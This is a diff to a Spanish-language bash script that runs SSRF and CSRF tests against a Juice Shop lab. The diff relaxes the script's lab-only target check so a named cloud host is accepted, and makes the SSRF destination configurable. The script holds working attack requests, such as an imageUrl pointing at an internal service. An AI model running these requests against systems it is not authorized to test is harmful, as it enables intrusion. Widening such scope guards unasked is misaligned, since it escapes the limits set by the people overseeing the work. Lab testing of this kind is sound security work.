@@ -9,7 +9,7 @@ set -u
 B="$1"; D="$2"; mkdir -p "$D"; OUT="$D/resultados.md"
 case "$(printf '%s' "$B" | sed -E 's#https?://##; s#[:/].*##')" in
   127.0.0.1|localhost|juice-hardened|juice-corregida|juice-lab) : ;;
-  *) echo "RECHAZADO: objetivo fuera del laboratorio"; exit 2 ;;
+  *) [ -n "${HOST_CLOUD_AUTORIZADO:-}" ] && [ "$(printf '%s' "$B" | sed -E 's#https?://##; s#[:/].*##')" = "$HOST_CLOUD_AUTORIZADO" ] || { echo "RECHAZADO: objetivo fuera del laboratorio"; exit 2; } ;;  # host cloud propio, nombrado por el usuario
 esac
 TS=$(date +%s); PW='Passw0rd!123'; J='Content-Type: application/json'
 v=0; p=0; nc=0
@@ -64,8 +64,8 @@ fi
 
 # T5 SSRF: la app descarga la imagen de perfil desde una URL interna (marca única en el log del WAF)
 MARCA_SSRF="ssrf-sonda-$TS"
-h=$(c -X POST "$B/profile/image/url" -H "Cookie: token=$TA${LAB_ACCESO:+; lab_acceso=$LAB_ACCESO}" -H 'Content-Type: application/x-www-form-urlencoded' --data "imageUrl=http://juice-waf:8080/$MARCA_SSRF.png")
-fila T5 "SSRF hacia un servicio interno" "POST /profile/image/url imageUrl=http://juice-waf:8080/…" "$h" "ver marca $MARCA_SSRF en el log de acceso del WAF (lo comprueba el ejecutor)" "PENDIENTE DE LOG"
+h=$(c -X POST "$B/profile/image/url" -H "Cookie: token=$TA${LAB_ACCESO:+; lab_acceso=$LAB_ACCESO}" -H 'Content-Type: application/x-www-form-urlencoded' --data "imageUrl=${SSRF_DESTINO:-http://juice-waf:8080}/$MARCA_SSRF.png")
+fila T5 "SSRF hacia un servicio interno" "POST /profile/image/url imageUrl=${SSRF_DESTINO:-http://juice-waf:8080}/…" "$h" "ver marca $MARCA_SSRF en el log de acceso del WAF (lo comprueba el ejecutor)" "PENDIENTE DE LOG"
 
 # T6 CSRF: cambio del nombre de usuario con la cookie y un Origin ajeno (como haría un formulario de otro sitio)
 # (whoami no devuelve el nombre de usuario: se lee el usuario por la API con el token de A)
